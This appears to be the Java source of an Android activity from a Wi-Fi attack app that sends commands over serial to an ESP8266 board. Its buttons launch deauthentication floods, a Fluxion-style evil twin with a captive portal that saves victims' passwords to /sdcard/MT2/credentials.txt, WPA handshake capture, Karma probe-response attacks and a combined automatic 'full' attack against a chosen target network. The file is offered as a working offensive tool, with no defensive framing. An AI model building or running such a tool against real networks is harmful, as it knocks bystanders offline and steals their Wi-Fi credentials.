package com.mt2.attack;

import android.app.Activity;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

public class AttackActivity extends Activity implements SerialManager.DataListener {

    private TextView logView, attackTargetSSID, attackTargetInfo;
    private EditText cliInput;
    private Button btnDeauth, btnEvilTwin, btnHandshake, btnKarma, btnFull, btnTDeauth, btnStop, btnBack, btnSend, btnDebug, btnAutoScroll;
    private ScrollView logScrollView;
    private SerialManager serial;
    private final StringBuilder logBuffer = new StringBuilder();
    private boolean autoScroll = true;
    private boolean debugMode = false;
    private String targetSSID, targetBSSID;
    private int targetChan;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            setContentView(R.layout.activity_attack);

            logView            = (TextView) findViewById(R.id.logView);
            logView.setMovementMethod(new ScrollingMovementMethod());
            logScrollView      = (ScrollView) findViewById(R.id.logScrollView);
            attackTargetSSID   = (TextView) findViewById(R.id.attackTargetSSID);
            attackTargetInfo   = (TextView) findViewById(R.id.attackTargetInfo);
            cliInput           = (EditText) findViewById(R.id.cliInput);
            btnDeauth          = (Button) findViewById(R.id.btnDeauth);
            btnEvilTwin        = (Button) findViewById(R.id.btnEvilTwin);
            btnHandshake       = (Button) findViewById(R.id.btnHandshake);
        btnKarma          = (Button) findViewById(R.id.btnKarma);
        btnFull           = (Button) findViewById(R.id.btnFull);
        btnTDeauth        = (Button) findViewById(R.id.btnTDeauth);
            btnStop            = (Button) findViewById(R.id.btnStop);
            btnBack            = (Button) findViewById(R.id.btnBack);
            btnSend            = (Button) findViewById(R.id.btnSend);
            btnDebug           = (Button) findViewById(R.id.btnDebug);
            btnAutoScroll      = (Button) findViewById(R.id.btnAutoScroll);

            serial = SerialManager.getInstance(this);
            serial.setListener(this);

            // Load target from prefs
            SharedPreferences prefs = getSharedPreferences(AppConstants.PREFS, MODE_PRIVATE);
            targetSSID  = prefs.getString(AppConstants.KEY_TARGET_SSID, "—");
            targetBSSID = prefs.getString(AppConstants.KEY_TARGET_BSSID, "—");
            targetChan  = prefs.getInt(AppConstants.KEY_TARGET_CHAN, 0);
            attackTargetSSID.setText("Target: " + targetSSID);
            attackTargetInfo.setText(targetBSSID + "  ch=" + targetChan);

        btnDeauth.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                appendLog("[USER] Starting DEAUTH...\n");
                serial.sendCommand("deauth");
            }
        });
        btnEvilTwin.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                String ssid = targetSSID;
                if (ssid == null || ssid.equals("—")) {
                    toast("No target");
                    return;
                }
                appendLog("[USER] Starting FLUXION-STYLE evil twin for " + ssid + "\n");
                appendLog("[USER] Phase 1: ESP8266 deauth real AP clients\n");
                // Tell ESP8266 to deauth
                serial.sendCommand("deauth");
                try { Thread.sleep(100); } catch (Exception e) {}
                // Then start twin with quoted SSID
                appendLog("[USER] Phase 2: ESP8266 evil twin AP (quoted SSID)\n");
                serial.sendCommand("twin \"" + ssid + "\"");
                try { Thread.sleep(100); } catch (Exception e) {}
                appendLog("[USER] Phase 3: run evil_twin_advanced.py on Termux host\n");
                appendLog("[USER]   $ python3 /sdcard/MT2/evil_twin_advanced.py --ssid \"" + ssid + "\" --channel " + targetChan + " --bssid " + targetBSSID + "\n");
                appendLog("[USER] Phase 4: clients forced to re-auth -> captive portal at 192.168.4.1\n");
                appendLog("[USER] Phase 5: passwords saved to /sdcard/MT2/credentials.txt\n");
            }
        });
        btnHandshake.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                String ssid = targetSSID.replaceAll(" ", "_");
                if (ssid.equals("—")) ssid = "capture";
                appendLog("[USER] Starting HANDSHAKE capture → /" + ssid + ".pcap\n");
                // First deauth to force reconnect (clients will re-auth)
                serial.sendCommand("deauth");
                try { Thread.sleep(100); } catch (Exception e) {}
                // Start promiscuous mode capture with quoted filename
                serial.sendCommand("cap \"" + targetSSID + "\"");
            }
        });
        btnKarma.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                String ssid = targetSSID;
                if (ssid == null || ssid.equals("—")) {
                    toast("No target");
                    return;
                }
                appendLog("[USER] Starting KARMA attack on " + ssid + "\n");
                appendLog("[USER] Clients searching for this network will auto-connect\n");
                appendLog("[USER] ESP8266 will respond to probe requests\n");
                appendLog("[USER] Type 'karma \"" + ssid + "\"' to start\n");
                serial.sendCommand("karma \"" + ssid + "\"");
            }
        });
        btnFull.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                appendLog("[USER] Starting FULL attack (auto: deauth+evil twin+karma+capture)\n");
                appendLog("[USER] Phase 1 (0-8s): deauth broadcasts\n");
                appendLog("[USER] Phase 2 (8s+): evil twin AP + handshake capture\n");
                appendLog("[USER] Phase 3: wait for client to auto-connect to fake AP\n");
                serial.sendCommand("full");
            }
        });
        btnTDeauth.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                appendLog("[USER] Starting TARGETED deauth to specific client\n");
                appendLog("[USER] First need to capture clients via 'cap <file>' (probe sniff)\n");
                appendLog("[USER] Or run 'combo' for full automatic attack\n");
                serial.sendCommand("tdeauth");
            }
        });
        btnStop.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                appendLog("[USER] STOP all\n");
                serial.sendCommand("stop");
            }
        });
        btnBack.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { finish(); }
        });
        btnSend.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { sendCustom(); }
        });
        cliInput.setOnEditorActionListener(new TextView.OnEditorActionListener() {
            @Override public boolean onEditorAction(TextView v, int actionId, android.view.KeyEvent event) {
                if (actionId == android.view.inputmethod.EditorInfo.IME_ACTION_SEND) {
                    sendCustom();
                    return true;
                }
                return false;
            }
        });
        btnDebug.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                debugMode = !debugMode;
                btnDebug.setText(debugMode ? "DEBUG✓" : "DEBUG");
                appendLog("[UI] debug " + (debugMode ? "ON" : "OFF") + "\n");
            }
        });
        btnAutoScroll.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                autoScroll = !autoScroll;
                btnAutoScroll.setText(autoScroll ? "AUTO✓" : "AUTO");
                appendLog("[UI] auto-scroll " + (autoScroll ? "ON" : "OFF") + "\n");
                if (autoScroll) scrollToBottom();
            }
        });
        } catch (Exception e) {
            // Show error to user, don't crash
            android.widget.Toast.makeText(this,
                "Init error: " + e.getClass().getSimpleName() + ": " + e.getMessage(),
                android.widget.Toast.LENGTH_LONG).show();
            e.printStackTrace();
            finish();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        serial.setListener(this);
    }

    private void sendCustom() {
        String cmd = cliInput.getText().toString().trim();
        if (cmd.isEmpty()) { toast("Enter a command"); return; }
        serial.sendCommand(cmd);
        cliInput.setText("");
    }

    private void scrollToBottom() {
        logScrollView.post(new Runnable() {
            @Override public void run() {
                logScrollView.fullScroll(ScrollView.FOCUS_DOWN);
            }
        });
    }

    private void appendLog(String line) {
        logBuffer.append(line);
        if (logBuffer.length() > 12000) {
            logBuffer.delete(0, logBuffer.length() - 12000);
        }
        logView.setText(logBuffer.toString());
        if (autoScroll) scrollToBottom();
    }

    @Override
    public void onData(String line) {
        // Filter debug lines unless enabled
        if (line.startsWith("[DBG") && !debugMode) return;
        appendLog("< " + line + "\n");
    }

    @Override
    public void onConnected(boolean isConn, String info) {
        try {
            if (isConn) {
                appendLog("[SYS] Connected: " + info + "\n");
            } else {
                appendLog("[SYS] Disconnected: " + info + "\n");
            }
        } catch (Exception e) {
            // Activity may be paused, ignore
        }
    }

    private void toast(String s) { Toast.makeText(this, s, Toast.LENGTH_SHORT).show(); }
}
